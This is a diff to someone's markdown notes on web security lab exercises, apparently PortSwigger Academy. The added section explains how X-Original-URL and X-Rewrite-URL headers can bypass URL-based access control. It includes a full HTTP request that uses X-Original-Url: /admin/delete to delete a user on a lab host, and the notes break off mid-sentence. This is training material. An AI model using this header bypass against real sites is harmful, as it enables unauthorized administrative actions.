@@ -112,9 +112,30 @@ now i get the access to admin panel and delete the user carlos.
 
 #### Lab: URL-based access control can be circumvented
 
+Some frameworks allow headers like `X-Original-URL`, `X-Rewrite-URL` to override the requested path. If access control is only applied to the visible URL, attackers can send a safe-looking request (like `/`) while forcing the backend to process a restricted path (like `/admin`), resulting in an access control bypass.
 
+```
+GET /?username=carlos HTTP/2
+Host: 0ae700c404149b5a83af1e2100600052.web-security-academy.net
+X-Original-Url: /admin/delete
+Cookie: session=BbQknXA42GuUnPsaBvvw3mC19s053I0c
+Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ae700c404149b5a83af1e2100600052.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+```
 
-
+so i use this concept to 
 
 
 
